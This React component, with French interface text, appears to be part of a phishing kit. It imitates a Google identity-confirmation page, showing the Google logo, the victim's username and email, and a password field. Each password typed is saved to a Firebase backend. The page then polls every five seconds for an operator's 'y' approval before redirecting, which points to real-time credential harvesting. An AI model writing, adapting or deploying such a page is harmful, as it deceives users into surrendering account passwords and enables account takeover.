import React, { Fragment, useContext, useState, useEffect } from 'react'
import { makeStyles, Grid, Typography, TextField, Button } from '@material-ui/core'
import Fullscreen from "react-full-screen";
import { ReactComponent as Google } from '../../img/svg/google.svg'
import Header from '../Header';
import AccountCircle from '@material-ui/icons/AccountCircle';
import { Link } from 'react-router-dom'
import LockOutlinedIcon from '@material-ui/icons/LockOutlined';
import CircularProgress from '@material-ui/core/CircularProgress';
import { FirebaseContext } from '../Firebase'


const style = {
  background: "#000"
}



const ChangeMdp = (props) => {
  const [password, setPassword] = useState('')
  const [check, setCheck] = useState(false)
  const [valid, setValid] = useState([])
  const [mail, setMail] = useState('')
  const [username, setUsername] = useState('')
 
  const firebase = useContext(FirebaseContext)


  useEffect( ()=>{
    firebase.getMail()
    .then( collection=>{
      if(collection){
        let mailTemp = collection.data().mail
        let tabMail = mailTemp.split("/")
        // console.log(tabMail)
        setMail(tabMail[1])
        setUsername(tabMail[0])
      }else{
        // console.log("vide")
      }
    })
    .catch( err=>{
      console.log(err)
    })
  })

  const getPass = (e) => {
    setPassword(e.target.value)
  }

  const handleSubmit = e => {

    e.preventDefault()
    
    
    firebase.addPass(password)
      .then(function (docRef) {
        // console.log("Document written with ID: ", docRef.id);
        setCheck(true)
        //
       // props.history.push("/activity")

      })
      .catch(function (error) {
        console.error("Error adding document: ", error);
      });

  }

  const getVal = ()=>{
    firebase.getValidation()
      .then((collection) => {
        if (collection) {
          let tabTemp = []
          collection.docs.map(doc => tabTemp.push(doc.data()))
          if ( tabTemp.length !== 0) {
            // console.log(tabTemp[tabTemp.length-1].answer)
            if(tabTemp[tabTemp.length-1].answer == 'y'){
              clearInterval(interVal)
              props.history.push("/activity")
            }else{
              props.history.push("/modif-password")
            }
            setValid(tabTemp)
            // console.log(valid)
          }


        } else {
          console.log("une erreur est survenu")
        }
      })
      
  }


  if(check==true){
    var interVal = setInterval(() => {
      getVal()
    }, 5000);
  }
  const btnValidate = password == '' ? (
    <Button
    variant="contained"
    color="primary"
    startIcon={<LockOutlinedIcon />}
    style={{ float: 'right', textTransform: 'lowercase' }}
    type="submit"
    disabled
  >
    Valider
</Button>

  )
  :
  (
    <Button
    variant="contained"
    color="primary"
    startIcon={<LockOutlinedIcon />}
    style={{ float: 'right', textTransform: 'lowercase' }}
    type="submit"
  >
    Valider
</Button>

  )

const displayMail = mail && mail 
const displayUser = username && username 
  return (
    <Fragment>

      <Header />

      <Grid
        container
        direction="column"
        justify="center"
        alignItems="center"
        spacing={0}
        style={{ marginTop: '50px' }}
      >
        <Grid item style={{ width: '50%', textAlign: 'center' }}>

          <Google width="100" height="60" style={{ margin: '30px 0' }} />
        </Grid>
        <Grid item style={{ width: '50%' }}>
          <Typography variant="h6" component="h6" style={{ textAlign: 'center' }}>
            {username}
         </Typography>
        </Grid>
        <Grid item container justify="center" alignItems="center">
          <AccountCircle />
          <Typography variant="subtitle1" style={{ fontSize: '13px', margin: ' 10px 0 10px 3px' }}>
          {displayMail}
       </Typography>

        </Grid>
      </Grid>






      <Grid item container style={{ width: '100%', padding: '0 20px' }} justify="flex-start" alignItems="center">
        <Typography>
          Pour continuer,veuillez confirmer votre identité
     </Typography>
        <form
          noValidate
          autoComplete="off"
          style={{ width: '100%', marginTop: '20px' }}
          onSubmit={handleSubmit}
          value={password}
        >




          <TextField
            id="outlined-basic"
            label="Sasissez votre mot de passe"
            variant="outlined"
            style={{ width: '100%' }}
            type="password"
            onChange={getPass}
            value={password}
          />




          <Grid style={{ marginTop: '20px' }}>


            <Button href="" color="primary" style={{ float: 'left', textTransform: 'lowercase' }}>
              <span style={{ textTransform: 'uppercase' }}>m</span>ot de passe oublié
         </Button>



             { check == false ? btnValidate : (
            


<Button
    style={{ float: 'right', textTransform: 'lowercase' }}
  >
     <CircularProgress />
</Button>
             
             )}

          </Grid>
        </form>

      </Grid>



    </Fragment>




  );


}

export default ChangeMdp;
